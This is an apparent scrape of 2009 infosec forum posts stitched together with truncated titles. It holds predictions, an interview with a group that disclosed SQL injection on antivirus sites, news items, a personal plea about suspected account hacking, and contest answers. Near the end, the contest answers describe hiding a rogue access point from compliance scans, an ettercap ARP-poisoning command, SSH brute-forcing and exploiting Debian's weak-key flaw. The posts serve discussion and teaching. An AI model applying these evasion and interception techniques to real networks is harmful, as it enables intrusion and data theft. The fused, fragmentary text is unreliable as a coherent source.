the current technology goes after low hanging fruit and companies will demand solutions that truly protect critical information. paul asadoorian of pauldotcoms 2009-2010 predictions. paul is weighing in with 3:     * other threats will become as easily exploitable as remote exploits. weve all seen how people scramble and make noise when microsoft releases a patch for a new remote exploit (ala ms08-067). we will start to see attackers using other most subtle measures, such as web applications and mobile device attacks, in the same manner. except, at least in the beginning, there will be no scramble and noise.     * wireless networks will continue to source attacks. so many organizations have done a good job implementing "secure" wireless networks. however, there are always other threats that will continue, such as guest networks, handheld devices, client-side wireless software, that will open doors for attackers. these attacks are targeted and subtle now, look for a "knock your socks off" wireless attack in 2009 to really help put the risks in perspective.     * someone will unplug the internet - weve danced around it for quite some time and have seen some examples (youtube.com went away briefly in 2008), but time has come for major meltdown. this will most likely be a targeted attack as we move closer to cyberwarfare tactics really hurting. with the economy in the us already weak, enemies will be looking to take their shots and cyberwarefare will be one of them. economic targets or even natural resources will be at risk. thats the fun about predictions, you dont have to be right and you can think big. [stephen northcutt] well that is certainly thinking big. for myself, i think there is enough redundancy that you cannot take down the internet. i guess the closest thing we have to study is the akamai attack

1;Titles & Namesrtful dodger wrote: one of the biggest things that can happen is to form a comfortable name for the profession with an identifiable purpose.  meaning, if i talk about hacking to my 10 year old nephew he thinks “cool, you get to be a clever bad guy!  neat!”  and he knows exactly what that word means.  if i talk about security analysis or penetration testing his eyes glaze over and he giggles at the word penetration.  so what happens when you try to sell to a ceo and add words like ethical hacker.  it is just plain difficult to explain our world.  but if we had some type of easily identifiable person, organization or something that is identifiable in pop culture, it would be so much easier.  the mafia has elliot ness and the fbi.  cops have robbers.  yin has yang.  hackers have “well were kinda like hackers, but don’t call us hackers we are info sec professionals and kinda….blah” an interesting point, but all jobs have multiple names, some cooler than others. sniper = counter-sniper, precision marksman, tactical marksman, sharpshooter, precision riflemen, and precision shooter personally, i dont care what you call me as long as i get to do my hacking/cracking/assessing/scanning and pay me my bucks/dollars/green backs/benjamins/clams. anyone else have any thoughts on the subject

2;Hackers of Kaspersky, Bitdefender, F-Secure and Symantec Speak Upnterview with the hacking group that blemished the names of some big time av vendors.   during the past few weeks, a romanian self-proclaimed ethical hacking group has kept the leading antivirus vendors on their toes after disclosing sql injection vulnerabilities on several of their websites. the security companies that have been affected include kaspersky, bitdefender, f-secure and symantec. even though some vulnerabilities have been less serious than others, these documented attacks have strengthened the idea that security is a cat-and-mouse game and that, indeed, no one is invulnerable on the internet today. the acts of these romanian hackers have attracted a lot of media attention and have raised enough controversy. who are they? what do they want? why do they do this? why are they after av vendors? – these are all questions that many users might have contemplated while reading the news stories. therefore, driven by curiosity and armed with lots of questions, softpedia has gone hunting for some answers and contacted the hackersblog crew. much to our surprise, at the other end of our “weapons” we have found people who are open to dialog and do not hesitate to speak their minds. if youre as curious as we have been, please read on to find out what we have dug up. softpedia: by now, everyone has become curious as to who you are. obviously, were not going to ask for your real identities, but more like what you do for a living. is any of you working in it security as a penetration testing professional or similar, or are you just hacking enthusiasts? hackersblog: we are just passioned about it security. some of us work in it but not particularly in security. we are mostly into web and software programming. softpedia: how did your group come to be? did you know each other since before hackersblog was set up? and while were at it, can anyone join your group? please elaborate. hackersblog: the name of the blog (united) speaks for itself. we come from different hacking groups and we have decided to put aside personal misunderstandings and unite for a greater cause. luckily for the rest of the people, this union has not been based on an idea of destruction and mayhem oriented towards companies and websites, but on cautioning users about the dangers out there on the web, as well as putting programmers on guard regarding the security flaws we find in their pages. this group is not limited in number, and we are open to anyone who will show that they can bring value to the group. the most important thing, though, is for them to share our principles and report the problems they find to webmasters, without misusing any unauthorized permission gained or resource accessed. softpedia: so far, most if not all vulnerabilities disclosed on hackersblog have been web-related. do you tend to focus on web application security? if yes, are you considering expanding your range in the future? hackersblog: lack of time is our main obstacle and this forces us to focus mainly on web applications for now. it is possible that we will expand our views into other areas, in the future. softpedia: the published proof of concept attacks that attracted the most media attention were based on sql injection or cross-site scripting (xss). do you also document other types of web attacks such as cross-site request forgery (csrf) or ui redressing (clickjacking)? hackersblog: csrf and clickjacking are somewhat inter-related with xss attacks. while csrf attacks are already widely known by the public and are heavily used in browser exploitation, we cannot say the same about clickjacking attacks, where things are still in their incipient phase. we will wait out to see how things develop with this kind of attacks before publishing anything about them. it would be a waste of valuable time to post explanations and tutorials that can already be easily found on the web. jeremiah grossman and his team do an amazing job, and we take great pleasure in reviewing their work as often as we can. softpedia: kaspersky has challenged your code of ethics, claiming that you have only given it one hour on a saturday to address the problem on its us support site before going public with it. how do you respond to that? what does "timely manner" mean according to your own standards? hackersblog: first of all, lets set the record straight from the start! that problem should have not been there in the first place! their complains about our "timely manner" are pitiful and shameful. they had about a day to take action. from our standpoint, one hour should be more than enough for a site of the caliber of kaspersky, let aside the fact that it was bad that it was there, as we previously mentioned. therefore, when it comes to such companies, a "timely manner" gives them more than just that. softpedia: you published a disclaimer on your website in which you advised that you would not disclose any sensitive information obtained as a result of successful exploitations. the guys at kaspersky said that you were more interested in fame than in causing damage. are you doing this for publicity? hackersblog: we just want to shed light on security problems on the web and make people understand that the internet is not just some playground, but can be a major eagle eye into our private lives. remember that our actions are non-profit and any publicity will not bring us any money, rather the opposite. softpedia: in less than two weeks, four antivirus vendors sustained attacks from your group – kaspersky, bitdefender, f-secure and symantec. should av vendors and security companies in particular be on their toes for similar attacks from your group? are you trying to make a point by targeting them? hackersblog: we didnt make a habit out of testing av websites. we thought it would only be fair to show people that other companies have similar issues. we wanted to make it clear that kaspersky was not the only one out there facing this kind of problems, and we didnt want to single them out. softpedia: security vendors strongly recommend that companies and webmasters implement strict code review practices in order to prevent such data leaks. does this sound hypocritical to you now, given that your actions prove they are just as vulnerable as anyone else? hackersblog: we are sure that those recommendations are made with the best of intentions in mind, both for protecting the privacy of their users, as well as for preventing undesirable situations for webmasters and companies from happening. softpedia: in addition, security vendors claim that when data breaches do happen, affected parties should be as transparent as possible and assume responsibility. how do you think the four affected antivirus developers have handled themselves in this respect? on the same note, what do you think of bitdefenders reaction, which has downplayed the attack on its partners website, even though it sells its products and uses its branding elements? hackersblog: it seems that kasperskys image was, by far, the most affected. we didnt expect that our disclosure would have such a devastating impact on them. we had no intention of undermining or affecting their public image in any way. their av products are very efficient and it would have been wonderful if their web interface had gotten the same attention as their security products. we think that f-secure and bitdefender had it easier simply because all eyes were on kaspersky at the time. bitdefender.pt was, indeed, a partner site. still, nobody cares about this detail, which becomes minute the more you dig into it. as long as they had the bitdefender logo all over the place, as long as they were selling only bitdefender products, and as long as the name of the website was bitdefender, who would consider such an insignificant detail as the fact that it was a partner site? needless to add, the website contained client data and the vulnerability would have made that available to anyone. the guys at f-secure.com seem to have had the best approach to the issue. they admitted they had a problem, they disclosed exactly what happened and that they looked at it as a lesson they learned from how to protect their website. symantec said that its vulnerability was not effective at all. whether or not the problem came from its error-handling routines, blind sql techniques could have been used to extract pieces of information from the database, by interpreting the different responses received from the server in case of an error / no error. it would have been pure insanity for an attacker to extract items of information with this technique, but still, the vulnerability was real. softpedia: finally, tell us a few words about what drives you to do what you do. give us some insight into your future plans. what should we expect from hackersblog next? hackersblog: we will do what we know best. we will publish more articles that will disclose vulnerabilities on (some major) websites. we hope that people will soon realize the fact that this kind of actions are beneficial and we also hope they are able to make a distinction between our research and black hat attacks, which are increasing web-wide. right now, the general public is not yet aware of the destructive power that the internet facilitates for anyone with just a little knowledge but the drive to do harm. we are aiming at opening their eyes and calling their attention to taking steps towards protecting themselves. softpedia: thank you for taking the time to answer our questions, and we hope to write more interesting news about your achievements in the future. hackersblog: thank you for your interest in our activity and also for giving us the opportunity to share some of our thoughts with your readers. knowledge is power only when applied. we hope to have an open dialog with anyone who wants to know more about our mission
0;Googlebot will do SQL Injection for you!his is a crazy attack method, very scary and ingenious on the attackers part. i wonder if google can be held liable? the dark side of google in the past months we were talking about google hacking as an effective tool for attack automation, attack targeting and attack proxying. last week, while i was investigating an attack vector, i "bumped" into another real life example of googles darker side. the attack vector i was investigating was an sqli attack on a specific php module. the fact that the attack vector was executed on a non php web application indicated that i am probably looking at some kind of automated attack and that it might be worthwhile to further investigate. looking-up the targeted resource verified that it is part of an open source php ecommerce project and that a past version of this resource was found vulnerable to sqli. nothing interesting up to that point, but i asked myself why was the attack executed on a non php web application? my next step was to look-up this specific attack vector in google search. bingo! the search results were very interesting... i was able to distinguish between two types of search results:    1. results that included the attack vector as part of the link (first example)    2. results that included the attack vector as part of the indexed content (second example) lets see what all this tells us... the search results page actually tells the whole attack story. as a first step, the attackers cause google to index web pages embedded with links that are actually sqli attack vectors. this can be achieved by using various methods, for example:    1. embedding malicious links in a controlled domain and then asking google to crawl    2. embedding malicious links in forums, blogs or any other content sharing platform these pages are the ones to be expressed as the second type of search results i mentioned above. next, google crawls the pages in which the malicious links were embedded and follows them. since the links are actually attack vectors, this action is translated into an sqli attack executed by the google against the target web applications. when google receives a response to the attack it indexes the data under the target applications domain name. this is illustrated by the first example of search results where the link (in green) is obviously an sqli attack vector and the meta description is an sql server error response. as the final step of the attack, the attacker extracts the results of the sqli attack by sending specially crafted search queries to google. what is really disturbing in this attack scenario is that attackers can both execute an attack and get the results back without issuing a single request to the target application - google does all of this for them. a lot has already been said regarding the gap between what google should and can do and what google actually does to prevent such issues. a new research conducted by the adc shows that this is only the tip of the iceberg and it is definitely not the only or the major security issue associated with google services. in fact, expect more on this topic in one of the coming security conferences where we take this to the next level by revealing a google service that enables even more advanced attack techniques. - elda

"think like our enemy!" that is, after all, the primary tenet of penetration testing aka ethical hacking, isnt it? after years of hardening physical systems, networks, oss, and applications, we have now come full circle to a new dawn of attack.  people are now the target of the advanced hacker, and the cross-hairs are focused squarely on their foreheads... literally.  it is only a matter of time before corporations feel the pain of wetware hacking requiring a new approach to testing and defense. let us know what you think of the webcast, the process of registering and viewing and what some of the other topics youd like to see. would you like to see more from chris & mike? do
3;Documentary: The Turth About Liarsanadian documentary that i thought might interest you. the entire video is available online along with an extended interview with paul ekman (inspiration for lie to me on fox). other highlights include a toy that gives you a small electric shock if you lie (great gift) and a study on detecting lies in electronic communications like email and im. good stuff. the truth is ... we are all liars. scientists say that by the age of four we have all learned to lie. we lie to protect ourselves and others. we lie to protect others feelings, and to get what we want and need. most of us fib in one of every four conversations that last more than ten minutes. one study showed that university students lie to their mothers fifty percent of the time. we lie in one-third of our conversations with our romantic partners, and we tell the most serious lies to the people we care about the most. (read more truth about lies) the truth about liars reveals the only certain thing we know about lying: everyone does it, and we cant easily detect it. in this entertaining documentary, world class specialists share their findings and theories about the art of the untruth including: paul ekman, developer of the micro expression training tool and author of telling lies, and why kids lie; jeff hancock, a cornell university professor who explores the role deception plays within the internet; stephen porter, a specialist in crime and deception as the director of the forensic certificate program at dalhousie university; and david livingstone smith, a philosopher dedicated to analyzing the link between nature and deception and co-founder of the new england institute for cognitive science and evolutionary psychology. (read more about the experts) from the common little white lie to promises made by those governing us, scientists tell us that lying is part of our daily lives. lying is integral to our survival, and the ability to lie is fundamental to how far we succeed in our work, romance, and everyday life. featuring the latest science, psychology, and technology, this surprising documentary also exposes our greatest weakness: our ability to sort the lies from the truth remains in the dark ages. the very unique relationship politicians have with the truth is also examined by the truth about liars using the watergate crisis, the clinton-lewinsky scandal and the iraq war as examples. it discusses how society has now come to not only often expect the bending of the truth from those in a position of power, but also the degree to which we now accept it. the truth about liars concludes with one essential choice we all face - do we want to live a trusting life and risk being misled, or be suspicious and risk disbelieving those who are telling the truth? http://www.cbc.ca/documentaries/doczone ... boutliars/ do

2;Hackers Stole Data on Pentagons Newest Fighter Jetashington (cnn) --   thousands of confidential files on the u.s. militarys most technologically advanced fighter aircraft have been compromised by unknown computer hackers over the past two years, according to senior defense officials. the internet intruders were able to gain access to data related to the design and electronics systems of the joint strike fighter through computers of pentagon contractors in charge of designing and building the aircraft, according to the officials, who did not want to be identified because of the sensitivity of the issue. in addition to files relating to the aircraft, hackers gained entry into the air forces air traffic control systems, according to the officials. once they got in, the internet hackers were able to see such information as the locations of u.s. military aircraft in flight. the joint striker fighter plane is the militarys new f-35 lightning ii. it designed to become the aircraft used by all of the branches of service. most of the files broken into focused on the design and performance statistics of the fighter, as well as its electronic systems, officials said. the information could be used to make the plane easier to fight or defend against. additionally, the system used by the aircraft to conduct self-diagnostics during flight was compromised by the computer intrusions, according to the officials. however, the officials insisted that none of the information accessed was highly sensitive data. the plane uses stealth and other highly sensitive electronic equipment, but it does not appear that information on those systems was compromised, because it is stored on computers that are not connected to the internet, according to the defense officials. the joint strike fighters main contractor is lockheed martin corp., and northrop grumman corp. and bae systems plc are major subcontractors in the planes production. lockheed martins chief financial officer denied that there was any breach of classified information, which was first reported by the wall street journal on tuesday. "the u.s. government doesnt talk a whole lot about this, and neither do we. but in response to the [wall street journal] report, we think its incorrect," said bruce tanner of lockheed martin. "theres never been any effective attack. we have measures in place, and theres never been a successful attack." in a statement released later, the company reiterated its position that no classified information had been accessed. "to our knowledge, there has never been any classified information breach. like the government, we have attacks on our systems continually and have stringent measures in place to detect and stop attacks," the statement said. representatives of bae systems and northrop grumman would not comment on the story and referred all questions to lockheed martin. different variations of the joint strike fighter will be produced for the different branches of service it will be used in. many international partners are helping build the plane, and it will be sold to u.s.-allied countries. the involvement of multiple nations raises concern about the level of computer security measures the partner countries have, officials said. companies contracting with the department of defense now have to prove that they are using the proper computer security before a contract can be awarded, pentagon officials said. that measure was put into place within the past year because of the increase in cyber intrusions, they said. asked whether sensitive technology for the joint strike fighter had been jeopardized, pentagon spokesman bryan whitman said, "i am not aware of any specific concerns." whitman would not confirm the cyber-security breach on the joint strike fighter program but said the number of attempted attacks on the u.s. militarys network has been on the rise. "we have seen the number of intrusion attempts more than double recently," he said. he would not reveal a timeline. he said the computer systems of the department of defense are scanned thousands of times a day by entities looking for ways inside u.s. military computer networks. officials could not say who was behind the computer hacking, which has occurred numerous times since 2007. the intruders were able to cover their tracks, making it look like the virtual break-ins were coming from various parts of the world, according to officials. the wall street journal reported that the attacks appeared to originate in china, citing "former u.s. officials." last month, a pentagon annual report to congress about chinas military power said china has been making continued progress in developing cyber-warfare techniques. the report noted that u.s. government computers were the target of "intrusions that appear to have originated" in china, although they were not confirmed to be from the chinese military. cnn requested a comment about the accusation from the chinese embassy in washington. an embassy spokesman denied the allegations to the wall street journal. the air force, the main program manager of the joint strike fighter program, has a number of ongoing investigations into the multiple hackings, officials said. the officials said that a number of safeguards have since been put into place to protect that system.  original story: http://www.cnn.com/2009/us/04/21/pentag ... index.html do
1;Conficker.E to self-destruct on May 5th?he evolution of the multi-faceted conficker worm is expected to take another turn this may 5th when the latest version, conficker.e, will simply self-destruct on infected machines, say a number of security researchers. f-secure, trend micro and secureworks are among those that believe conficker.e—first spotted just this april and probably created by the same attackers that since last fall let loose the conficker.a through conficker.c variants—has been designed to simply self-detonate on may 5th. “it will simply self-destruct,” says mikko hypponen, chief research officer at f-secure, pointing out that researchers, who had been arguing over name for variants, agreed to skip past the name “conficker.d” entirely to settle on the name “conficker.e.” http://www.networkworld.com/news/2009/0 ... -worm.html what would be their motivation to do this? if you have gained ground, why give it up? why not have it pull updates and continue on? my best guess is the authors authors just want to get drunk on cinco de mayo and they dont want to worry about it that day or the next then they have severe hangovers. anyone else have a better conspiracy theory

"we are working on a development schedule for these updates and will post a timeline as soon as possible," adobes david lenoe said on the companys product security incident response team blog.  in the meantime, lenoe recommended that users disable javascript to protect themselves against attacks. he describes how in the blog post. news of the flaw, which relates to a javascript memory corruption error and garnered a "highly critical" rating from secunia, comes not long after adobe was forced to deal with a similar bug that was being targeted in active attacks -- but took the software giant weeks to patch. some observers criticized the company for the delayed disclosure of the bug and the subsequent slow fix, while others recommended using alternative pdf readers, such as foxit. "this is not the first time that critical vulnerabilities have been found in adobes software," sophos graham cluley said on wednesday his blog. "and there is growing concern tha the vendors dominant market share of the pdf reader market is proving extremely attractive for hackers hellbent on infecting as many pcs as possible." adobe representatives defended their stance, saying they did not want to reveal too much information to potential attackers. original story: http://www.scmagazineus.com/adobe-confi ... le/131576/ this is even more interesting as i just attended the  owasp chicago  meeting last night, and our guest speaker was  rafal los of hp . he spoke on hacking ria (rich internet apps) including pdf, flash, etc. he specifically stated, "why in the world would you ever put javascript in a pdf document?" timing couldnt have been better. do

1;Approach for an encryptioni, while discussing with a colleague the idea came about the following encryption approach where i would like to hear your opinions about it. sensitive data could be encrypted by using some routine (e.g. xor; of course i knew that this offers none protection at all, but to pass the idea its fine) which is used with a string chosen by the user. this string is nowhere stored, so it would not be possible to extract it somehow in the protected/ encrypted data with reverse engineering, dma, etc. when it is needed to decrypt the data (e.g. by booting an enrypted hdd) the user must enter the string which was chosen for encrypting it to receive the right data. if entering a wrong string the data still gets encrypted but with the supplied string and therefore resulting in garbage data. only attack point i came up with was with brute-forcing, but this should if chosen a strong encryption routine and string combo very time consuming, especially when you would have to reboot for every attempt. any thoughts on this? is such a system already available or have i overlooked something (weakness)? this was just an idea we came up with, however, as rsa etc. seems to be quite secure there wouldnt be really a need for this, just curious on other opinions
2;Twitter Falls Under a Gorilla Attackwitter is increasingly the medium of choice for pr pros and pranksters alike. can it survive the onslaught of attacks from flacks and hacks? excerpt from page 2: someone (or a group of someones) created an unknown number of fake accounts designed to push the hashtag #gorillapenis (dont blame me, i didnt do it) into the trending topics on twitter. each tweet contained a tiny url directing you to a site where youre asked to take a "survey." the survey offered coupons for discounts on pharmaceuticals or pet food in exchange for completing more surveys, each of which captured your name, phone numbers, and e-mail address. once you complete a survey, you get rewarded with "premium content" -- a brief forum post comparing, yes, the size of the gorilla, chimp, and human members. fascinating, no? best-case scenario: marketers will use this data to send you oodles more spam. worst case? hackers will use it as social engineering fodder for identity theft. judging by the way my browser redirected itself en route to these surveys, id guess were looking at an affiliate scheme whereby whoever was doing the redirects was collecting a few pennies for each sucker who bit. according to cnet blogger harrison hoffman, the source of the twitter hack may have been 4chan, the merry pranksters of the web responsible for the anonymous attacks on scientology, for hacking time.coms 100 most influential people on the web, and scads of other juvenile japes. if so, this is very bad news indeed. until now, 4chan seems to have been motivated by pure "lolz," or the sheer adolescent thrill of making large numbers of netizens look like tools. if theyve decided to go into business, were in deep kimchee. the twits in charge responded quickly by taking the hashtag out of trending topics and nuking many of the fake accounts (though i still found a fair number of them last time i checked). for that they should be commended. but it seems in 86ing the fake accounts, they also took down a number of legitimate ones by mistake (according to "social geek" blogger jesse stay). not so commendable. which brings us back to disturbing story no. 1. if twitter is indeed the medium of choice for future news about products, companies, or really, anything, and it can be this easily gamed -- thats a dangerous combination. when the gatekeepers for information are the folks who fall for some monkey business about a primates privates, its time to worry. original story: http://www.infoworld.com/d/adventures-i ... 8?page=0,1 do
2;Google OS Could Put Squeeze on Other Flavors of Linuxust when several linux distributions seemed to be gaining a foothold, the search giants brand and reputation may soon curtail their success by agam shah | idg news service much of the discussion around googles new pc operating system has focused on a looming battle with windows, but the biggest losers could be other linux oses that have been enjoying some moderate success on netbooks, industry analysts said. google announced late tuesday that it is developing the chrome os, a lightweight operating system based on linux and geared for people who do much of their computing on the web. the software will eventually run on pcs, but before that it will appear first in netbooks in the second half of 2010, google says. several linux-based oses for netbooks are available today, including canonicals ubuntu netbook remix, goodoss gos 3.1 gadgets, and moblin 2.0 beta, which is backed by intel. the linux distributions provide easy access to web applications from the home screen and are designed to boot up quickly. netbooks, which initially were too small and low-cost to run a full-fledged windows os, provided an opportunity for linux to establish itself in personal computers, an area where it struggled for years to achieve a mainstream role. but just when some linux distributions seemed to be gaining a foothold, google may soon curtail their success. the strength of its brand, and its reputation as a company that builds sleek and easy-to-use products, means it could steamroll over the other linux candidates, said joshua martin, senior analyst at the yankee group. consumers will be drawn to a brand they recognize and that they associate with efficient online services, rather than to lesser-known names like ubuntu and moblin, martin said. googles reputation for creating popular online services may also encourage pc makers to adopt the os in netbooks, he said. other linux distributions still havent been widely successful in netbooks, setting the bar low for googles chrome os to succeed, said al gillen, program vice president at idc. "with consumers, who are less likely to be concerned about track record and commercial support, google chrome os could do better than other distros," gillen said. there is also a high level of fragmentation in the netbook market, with multiple versions of linux installed on different machines, a weakness that google could exploit. ultimately, however, end-users will decide whether the google os will succeed. linux-based netbooks have seen slow adoption, with many consumers preferring the familiarity of windows. over the past few quarters, around 90 percent of netbooks in mature markets, and as many as 70 percent in developing countries, have shipped with windows, according to gartner. a battle will take place among chrome and the other linux distributions, but together they could also create a dent in microsofts windows franchise. chrome could help to give linux more recognition on the desktop, creating an easier path for other distributions, according to some linux providers. for complete story: http://www.infoworld.com/d/open-source/ ... -linux-688 do
1;Help me figure how puter was hacked--?n my attempts to protect my toddler granddaughter from harm, ive been attacked through many means, one being my private correspondence via my computer/internet. details of the harm my granddaughter is faced with are not as important in this forum as my finding out how to prevent someone from making me appear to have used the internet in a harmful way against my daughter and her family.    i believe that my daughter or someone she knows is using some means to access my emails, facebook, and other areas to locate any info ive been sharing regarding the harm to my granddaughter.    example: private correspondence i had with a psychologist thru facebook suddenly appeared on her public wall 3 days after i sent the private message. the public display on the wall was copied and pasted from the private message in 3 parts and the icon indicated i did it when in fact i hadnt.    another example: i sent an email to an individual and the content [which was altered to imply different intentions than originally meant] of that email was made available in a court document to imply i made a threat when i had not. this info was obtained through some means other than the receiver of it giving it out the info. additionally, the original email had been deleted from my mailbox so that i cannot show that the email was altered. the person i sent the email to cannot find it, either.    i need help in finding out how to prove that this has happened. this is a very difficult thing to ask as im not sure this forum will be willing to help me although it appears you guys have the knowledge to help me. she and her husband and some of their friends are all in this together but i have yet to prove it fully. they have gone as far as coaching my little granddaughter to act in terror when she hears my name although the little one has not seen me or spoken to me since 2006 when she was only 2 1/2.â  she will be 6 in a few weeks.    because i went to my daughters pediatrician 3 years ago with some very alarming things my granddaughter told me about her father, my daughter has not allowed me to see the grandchildren ( just had the 3rd in june) since 2006. the doctor reported them to the child protective services. this year 4 reports were made, according to my daughter, one of which was made by me. obviously, some other people have concerns as well.    due to more reports having been made to cps, my daughter and her husband and some of their friends have conspired to find ways to report me from mental health mobile unit to adult protective svces to the dist attorney to family court.â  if anything, my daughter is digging her own grave with her teeth as she has had to lie to bring false complaints against me so that i appear not credible. one post was asking her friends to beat me. the authorities look at this as a family squabble but my daughters actions are getting out of hand and quite serious. if i can find a way to prove that my computer has been hacked, then they will entertain my concerns. i know for sure its being accessed no matter how many times i change my password. ive even gotten emails alerting me to password changes from aol as i sit at the computer! ive been told they are probably doing something similar to sharing like techs do when they help with a computer problem and are able to see what i see and access what i access.   please, someone help!!!â  thank you in advance...jennife

well according to pci dss 1.2, as a minimum, you only need to check for rouge aps once a quarter.  while phillips design, inc. is clearly only trying to meet the letter of compliance as mentioned in section 11.1, one could argue that this is not the true spirit of pci.  so, in this case it seems the pci consultants only checked for a time-span of 28 minutes and whether or not they stayed in one location or roved the building(s) premises, both inside and out, during their assessment time is unknown in this story and potentially a moot point.   also, pci 11.1 still doesn’t specify what channels and frequencies to scan nor does it imply that you have to check from multiple locations therefore it is plausible that some signals will go undetected.  nonetheless, i had a hard time trying to figure this question out as i saw a few possibilities which may mean i am missing or not correlating some obvious information in the story.  all i can count on is the fact that since peter is using a directional antenna from the parking lot, i can rule out a laptop/mini using a mobile broadband card.  anyway, below are some of the possibilities that could explain how detection was avoided: • greg could have built a faraday cage of sorts that only allowed the signal to escape out a window in mike’s office is unlikely, but plausible.  a more realistic effect could be applied by replacing any omni directional antenna(s) found on most ap’s with a directional antenna that pointed into the parking lot.  also, changing the beacon interval and transmit power to low will help curb detection. • another possibility is that the rouge ap is not a wi-fi router as most would assume, but possibly a laptop/mini with a long range bluetooth enabled usb dongle whose range could be as far as 100 meters.  this kind of signal would not be picked up by kismet, but would be seen  by a spectrum analyzer or using programs like btscan or hcitool.  or could it indeed be a hacked wireless router ap with the wi-fi signal turned off and one of these bluetooth-bad-boys installed in the routers usb port. http://www.anycom.com/products/bluetoot ... ab=support • without wi-fi probes constantly running.  rouge aps could pop up at anytime.  for example, some of the newer wi-fi routers like the d-link 655 allow the wi-fi radio to be scheduled thus allowing you to turn the ap on/off during the hours when most pci consultants and it staff have long gone home.  a similar effect could be achieved by writing a tool to turn on and off the wireless radio on a laptop/mini running ap emulation software like hostap.  below is way to do script the enable/disabling of the wireless radio for an apple airport extreme. http://forums.macosxhints.com/showthread.php?t=93014 • while it appears the boondoggle ap is using channel 11. this is noteworthy that in the us and canada, channels 1-11 are the only channels permitted for use by the fcc.  however, channels 12, 13 (europe) and 14 (japan) also exist.  since the pci compliance auditors are probably from a us firm and they seemed to only use kismet. it should be noted that channels 12-14 are not scanned for by default.  however, to scan these channels you could edit the kismet.conf file to include those channels and you may need to change the driver version of you wi-fi card from us to say jp for japan. • while i would hope this is not the case, i suppose the pci consultants wi-fi card might only be 802.11 b/g capable.  this means they would not be picking up any 802.11a (5ghz) signals. • also the ap could be a hacked router running openwrt with wknock-ng where the ap is configured not to respond or wakeup unless the right sequence of port knocking triggers it to come alive.  however, in this case the ap could be broadcasting but not responding to anything on the wire.  however, the pci consultant should have seen this, triangulated the signal and tracked this down to mikes office. lastly, onto my educated guess since i have to pick one.   in this case, i believe the most plausible based on the storyline is that the open ap called netgear is a trojan horse so to speak.  let me explain.  i believe the rouge access point was set to be cloaked by the real netgear ap during the pci consultants visit.  i believe the rouge ap was set to have a very low transmit power and was setup to clone the existing netgear ssid and mac address whose higher transmit power seemingly overtook the pci scan.  however, i reviewed the mac address for ssid boondoggle and that device did not resolve to any vendor which is a cause for suspicion.  so i would have to assume that the rouge ap was subsequently changed to the ssid “boondoggle” and the mac address “01:1a:70:fc:c0:6f” which is clearly spoofed. 3. how did peter compromise the target system? (hint: no previously undisclosed exploits were used; remember, this was 1973, which would have made it a -12775-day exploit) (you got me here… however my guess based on the dump) it seems they attacked by first launching an arp poisoning attack possibly using the following ettercap command which will redirect all request to the rogue ap 172.16.0.6 for sniffing. ettercap –i eht0 –t –m arp:remote /172.16.0.99/ /172.16.0.6/ > dump.txt i believe at some point they attacked mr. phillips desktop using the metasploit framework with a payload that targeted an openssh vulnerability found in ubuntu 7.1.  i think they then injected an installation of vnc server which is how they accessed his machine but did not confirm this. congrats, do
3;Skillz February 2009 Winning Entry - Creativeim medin “dad, i feel downright awful about what we did,” peter whimpered. “we just wanted to help.” “before the dot com bust i was a leet haxor,” says alice. “i had to fall back on house cleaning since i didnt want to get stuck in a dead end job. you know they say that pen testing is going to be dead soon.” “well, with computers now we dont need many pens, or people to test them,” responded mike. carols blank stare and the laugh track reveal that mike doesnt know what he is talking about. “ok, let me explain to you what happened. first, lets open olivers packet capture and figure out how the kids connected to the office.” alice continues, “if you look right at the beginning of the capture you can see that boondoggle got them into this boondoggle.” cisco-li_fc:c0:6f honhaipr_1b:03:fa probe response, sn=1, fn=0, flags=........, bi=100, ssid="boondoggle" “we can see the mac address of the access point is 00:1a:70:fc:c0:6f and the mac address of the kids olpc is 00:19:7d:1b:03:fa. if we look further we can see a lot of traffic between these two devices,” said alice. “but mike, i though you just had some kind of compliance guy come in, why couldnt he find the access point,” questioned carol. “we set the access point to not broadcast its ssid,” cindy said sheepishly. “but it still broadcasts, you can see here that instead of broadcasting boondoggle it broadcasts null characters. the pci assessor couldnt get any detailed information on it unless someone connected, and we, uh, peter, didnt connect until after everyone was gone.” “cindy! you were in on this too!” carol screamed. cindy shamefully bows her head and hides behind peter. “yes, mommy,” she whispers. “we know how they got the access point inside and how they connected to it, but how did they access the hr database?” asked mike. alice begins, “you see here where there are all these packets that say syn and rst, ack? they tried to connect to connect to every port on mr. phillips machine to see what was accessible.” “and we found that port 22 was open,” injected greg. “but there is only one port on the back of his machine,” mike says confused which queues the laugh track again. alice continues, ignoring mikes ignorance and total noobness. “if you look down further you see lots of traffic on port 22. traffic on port 22 is typically ssh and from the number of attempts it appears they tried to brute force the password and eventually got in.  “mike, your office do they ever patch?” asks alice. “patch what?” “there was an issue with debian where the encryption wasnt as strong as it could be. i wonder if we might be able to see what the kids did,” alice ponders. a look of fear comes across the childrens faces. alice breaks out her laptop and gets to work. she, like ed skoudis, is a josh wright fan and goes to willhackforsushi.com. she looks over the “decrypting debian-vulnerable ssh traffic” and works her mojo with wireshark to extract the session. she then joshs tools against the dump and ends up with the encrypted traffic from the server. “well, the laptop was patched, but the server wasnt, so we can see the servers half of the conversation. first thing the kids did was to look around a bit to see if anyone else was connected and what was running. after that they came across a php file that contained credentials to the database and used those credentials to create their own php to run commands against the database.” “as you can see they searched around and eventually found the payroll database and the salary table. they eventually came across the payroll information. by the way mike, you are due for a raise if the perfume warehouse design goes well, and you get paid just $18,500.” mike scowls. “yeah, dad, that is why we though we would help and bump your salary to $185,000!” said greg with glee. “well kids, i appreciate the help but i want to build my salary on my own. get it, build, im an architect.” the kids groan, the stupid laugh track kicks in again, and fade to credits. congrats, do

